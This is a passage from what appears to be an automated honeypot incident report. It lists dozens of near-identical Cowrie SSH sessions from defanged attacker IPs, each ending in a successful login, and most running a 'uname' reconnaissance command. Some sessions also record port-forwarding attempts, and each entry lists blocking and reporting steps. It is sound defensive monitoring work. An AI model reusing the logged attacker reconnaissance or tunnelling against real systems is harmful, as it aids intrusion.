| **First Seen** | 2026-08-24 01:20 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:20:41` | `cowrie.session.connect` |
| `2026-08-24 01:20:41` | `cowrie.client.version` |
| `2026-08-24 01:20:41` | `cowrie.client.kex` |
| `2026-08-24 01:20:42` | `cowrie.login.success` |
| `2026-08-24 01:20:43` | `cowrie.session.params` |
| `2026-08-24 01:20:43` | `cowrie.command.input` |
| `2026-08-24 01:20:43` | `cowrie.log.closed` |
| `2026-08-24 01:20:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b908db3cc7fb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:20 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:20:46` | `cowrie.session.connect` |
| `2026-08-24 01:20:46` | `cowrie.client.version` |
| `2026-08-24 01:20:47` | `cowrie.client.kex` |
| `2026-08-24 01:20:47` | `cowrie.login.success` |
| `2026-08-24 01:20:48` | `cowrie.session.params` |
| `2026-08-24 01:20:48` | `cowrie.command.input` |
| `2026-08-24 01:20:48` | `cowrie.log.closed` |
| `2026-08-24 01:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505556921a54

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:20 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:20:52` | `cowrie.session.connect` |
| `2026-08-24 01:20:52` | `cowrie.client.version` |
| `2026-08-24 01:20:52` | `cowrie.client.kex` |
| `2026-08-24 01:20:52` | `cowrie.login.success` |
| `2026-08-24 01:20:53` | `cowrie.session.params` |
| `2026-08-24 01:20:53` | `cowrie.command.input` |
| `2026-08-24 01:20:53` | `cowrie.log.closed` |
| `2026-08-24 01:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a32493c8e6f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:20 |
| **Last Seen** | 2026-08-24 01:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:20:57` | `cowrie.session.connect` |
| `2026-08-24 01:20:57` | `cowrie.client.version` |
| `2026-08-24 01:20:57` | `cowrie.client.kex` |
| `2026-08-24 01:20:57` | `cowrie.login.success` |
| `2026-08-24 01:20:58` | `cowrie.session.params` |
| `2026-08-24 01:20:58` | `cowrie.command.input` |
| `2026-08-24 01:20:58` | `cowrie.log.closed` |
| `2026-08-24 01:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6ba2ec7b576

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:02` | `cowrie.session.connect` |
| `2026-08-24 01:21:02` | `cowrie.client.version` |
| `2026-08-24 01:21:02` | `cowrie.client.kex` |
| `2026-08-24 01:21:03` | `cowrie.login.success` |
| `2026-08-24 01:21:03` | `cowrie.session.params` |
| `2026-08-24 01:21:03` | `cowrie.command.input` |
| `2026-08-24 01:21:04` | `cowrie.log.closed` |
| `2026-08-24 01:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4092e99dea73

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:07` | `cowrie.session.connect` |
| `2026-08-24 01:21:07` | `cowrie.client.version` |
| `2026-08-24 01:21:07` | `cowrie.client.kex` |
| `2026-08-24 01:21:08` | `cowrie.login.success` |
| `2026-08-24 01:21:09` | `cowrie.session.params` |
| `2026-08-24 01:21:09` | `cowrie.command.input` |
| `2026-08-24 01:21:09` | `cowrie.log.closed` |
| `2026-08-24 01:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05d85036fbdf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:12` | `cowrie.session.connect` |
| `2026-08-24 01:21:12` | `cowrie.client.version` |
| `2026-08-24 01:21:12` | `cowrie.client.kex` |
| `2026-08-24 01:21:13` | `cowrie.login.success` |
| `2026-08-24 01:21:14` | `cowrie.session.params` |
| `2026-08-24 01:21:14` | `cowrie.command.input` |
| `2026-08-24 01:21:14` | `cowrie.log.closed` |
| `2026-08-24 01:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-791273eca5dd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:17` | `cowrie.session.connect` |
| `2026-08-24 01:21:17` | `cowrie.client.version` |
| `2026-08-24 01:21:18` | `cowrie.client.kex` |
| `2026-08-24 01:21:18` | `cowrie.login.success` |
| `2026-08-24 01:21:19` | `cowrie.session.params` |
| `2026-08-24 01:21:19` | `cowrie.command.input` |
| `2026-08-24 01:21:19` | `cowrie.log.closed` |
| `2026-08-24 01:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3460cf5f24b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:22` | `cowrie.session.connect` |
| `2026-08-24 01:21:22` | `cowrie.client.version` |
| `2026-08-24 01:21:23` | `cowrie.client.kex` |
| `2026-08-24 01:21:23` | `cowrie.login.success` |
| `2026-08-24 01:21:24` | `cowrie.session.params` |
| `2026-08-24 01:21:24` | `cowrie.command.input` |
| `2026-08-24 01:21:24` | `cowrie.log.closed` |
| `2026-08-24 01:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30b969427327

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:28` | `cowrie.session.connect` |
| `2026-08-24 01:21:28` | `cowrie.client.version` |
| `2026-08-24 01:21:28` | `cowrie.client.kex` |
| `2026-08-24 01:21:28` | `cowrie.login.success` |
| `2026-08-24 01:21:29` | `cowrie.session.params` |
| `2026-08-24 01:21:29` | `cowrie.command.input` |
| `2026-08-24 01:21:29` | `cowrie.log.closed` |
| `2026-08-24 01:21:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79e731e37666

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:32` | `cowrie.session.connect` |
| `2026-08-24 01:21:32` | `cowrie.client.version` |
| `2026-08-24 01:21:32` | `cowrie.client.kex` |
| `2026-08-24 01:21:33` | `cowrie.login.success` |
| `2026-08-24 01:21:33` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:21:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:21:33` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:21:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28f2b2a61f33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:33` | `cowrie.session.connect` |
| `2026-08-24 01:21:33` | `cowrie.client.version` |
| `2026-08-24 01:21:33` | `cowrie.client.kex` |
| `2026-08-24 01:21:34` | `cowrie.login.success` |
| `2026-08-24 01:21:34` | `cowrie.session.params` |
| `2026-08-24 01:21:34` | `cowrie.command.input` |
| `2026-08-24 01:21:35` | `cowrie.log.closed` |
| `2026-08-24 01:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d253c57c096

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:36` | `cowrie.session.connect` |
| `2026-08-24 01:21:36` | `cowrie.client.version` |
| `2026-08-24 01:21:36` | `cowrie.client.kex` |
| `2026-08-24 01:21:37` | `cowrie.login.success` |
| `2026-08-24 01:21:37` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:21:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:21:37` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6c79326a902

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:38` | `cowrie.session.connect` |
| `2026-08-24 01:21:38` | `cowrie.client.version` |
| `2026-08-24 01:21:38` | `cowrie.client.kex` |
| `2026-08-24 01:21:39` | `cowrie.login.success` |
| `2026-08-24 01:21:39` | `cowrie.session.params` |
| `2026-08-24 01:21:39` | `cowrie.command.input` |
| `2026-08-24 01:21:40` | `cowrie.log.closed` |
| `2026-08-24 01:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3425bd277ae1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:44` | `cowrie.session.connect` |
| `2026-08-24 01:21:44` | `cowrie.client.version` |
| `2026-08-24 01:21:44` | `cowrie.client.kex` |
| `2026-08-24 01:21:44` | `cowrie.login.success` |
| `2026-08-24 01:21:45` | `cowrie.session.params` |
| `2026-08-24 01:21:45` | `cowrie.command.input` |
| `2026-08-24 01:21:45` | `cowrie.log.closed` |
| `2026-08-24 01:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c06e47d085b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:49` | `cowrie.session.connect` |
| `2026-08-24 01:21:49` | `cowrie.client.version` |
| `2026-08-24 01:21:49` | `cowrie.client.kex` |
| `2026-08-24 01:21:49` | `cowrie.login.success` |
| `2026-08-24 01:21:50` | `cowrie.session.params` |
| `2026-08-24 01:21:50` | `cowrie.command.input` |
| `2026-08-24 01:21:50` | `cowrie.log.closed` |
| `2026-08-24 01:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc6de6013fda

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:54` | `cowrie.session.connect` |
| `2026-08-24 01:21:54` | `cowrie.client.version` |
| `2026-08-24 01:21:54` | `cowrie.client.kex` |
| `2026-08-24 01:21:55` | `cowrie.login.success` |
| `2026-08-24 01:21:56` | `cowrie.session.params` |
| `2026-08-24 01:21:56` | `cowrie.command.input` |
| `2026-08-24 01:21:56` | `cowrie.log.closed` |
| `2026-08-24 01:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33565700ef77

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:21 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:21:59` | `cowrie.session.connect` |
| `2026-08-24 01:21:59` | `cowrie.client.version` |
| `2026-08-24 01:22:00` | `cowrie.client.kex` |
| `2026-08-24 01:22:00` | `cowrie.login.success` |
| `2026-08-24 01:22:01` | `cowrie.session.params` |
| `2026-08-24 01:22:01` | `cowrie.command.input` |
| `2026-08-24 01:22:01` | `cowrie.log.closed` |
| `2026-08-24 01:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f5e2566d95

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:22 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:22:05` | `cowrie.session.connect` |
| `2026-08-24 01:22:05` | `cowrie.client.version` |
| `2026-08-24 01:22:05` | `cowrie.client.kex` |
| `2026-08-24 01:22:05` | `cowrie.login.success` |
| `2026-08-24 01:22:06` | `cowrie.session.params` |
| `2026-08-24 01:22:06` | `cowrie.command.input` |
| `2026-08-24 01:22:06` | `cowrie.log.closed` |
| `2026-08-24 01:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa92a3613bc3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:22 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:22:10` | `cowrie.session.connect` |
| `2026-08-24 01:22:10` | `cowrie.client.version` |
| `2026-08-24 01:22:10` | `cowrie.client.kex` |
| `2026-08-24 01:22:10` | `cowrie.login.success` |
| `2026-08-24 01:22:11` | `cowrie.session.params` |
| `2026-08-24 01:22:11` | `cowrie.command.input` |
| `2026-08-24 01:22:11` | `cowrie.log.closed` |
| `2026-08-24 01:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26c153cd3d49

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:22 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:22:15` | `cowrie.session.connect` |
| `2026-08-24 01:22:15` | `cowrie.client.version` |
| `2026-08-24 01:22:15` | `cowrie.client.kex` |
| `2026-08-24 01:22:16` | `cowrie.login.success` |
| `2026-08-24 01:22:16` | `cowrie.session.params` |
| `2026-08-24 01:22:16` | `cowrie.command.input` |
| `2026-08-24 01:22:16` | `cowrie.log.closed` |
| `2026-08-24 01:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5a1bd356cca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:22 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:22:20` | `cowrie.session.connect` |
| `2026-08-24 01:22:20` | `cowrie.client.version` |
| `2026-08-24 01:22:20` | `cowrie.client.kex` |
| `2026-08-24 01:22:21` | `cowrie.login.success` |
| `2026-08-24 01:22:22` | `cowrie.session.params` |
| `2026-08-24 01:22:22` | `cowrie.command.input` |
| `2026-08-24 01:22:22` | `cowrie.log.closed` |
| `2026-08-24 01:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08a398044392

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:22 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:22:25` | `cowrie.session.connect` |
| `2026-08-24 01:22:25` | `cowrie.client.version` |
| `2026-08-24 01:22:25` | `cowrie.client.kex` |
| `2026-08-24 01:22:26` | `cowrie.login.success` |
| `2026-08-24 01:22:27` | `cowrie.session.params` |
| `2026-08-24 01:22:27` | `cowrie.command.input` |
| `2026-08-24 01:22:27` | `cowrie.log.closed` |
| `2026-08-24 01:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab7a5c61e376

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:22 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:22:31` | `cowrie.session.connect` |
| `2026-08-24 01:22:31` | `cowrie.client.version` |
| `2026-08-24 01:22:31` | `cowrie.client.kex` |
| `2026-08-24 01:22:31` | `cowrie.login.success` |
| `2026-08-24 01:22:32` | `cowrie.session.params` |
| `2026-08-24 01:22:32` | `cowrie.command.input` |
| `2026-08-24 01:22:32` | `cowrie.log.closed` |
| `2026-08-24 01:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64c54b172c23

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:22 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:22:36` | `cowrie.session.connect` |
| `2026-08-24 01:22:36` | `cowrie.client.version` |
| `2026-08-24 01:22:36` | `cowrie.client.kex` |
| `2026-08-24 01:22:36` | `cowrie.login.success` |
| `2026-08-24 01:22:37` | `cowrie.session.params` |
| `2026-08-24 01:22:37` | `cowrie.command.input` |
| `2026-08-24 01:22:37` | `cowrie.log.closed` |
| `2026-08-24 01:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00d3eafabb14

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:22 |
| **Last Seen** | 2026-08-24 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:22:41` | `cowrie.session.connect` |
| `2026-08-24 01:22:41` | `cowrie.client.version` |
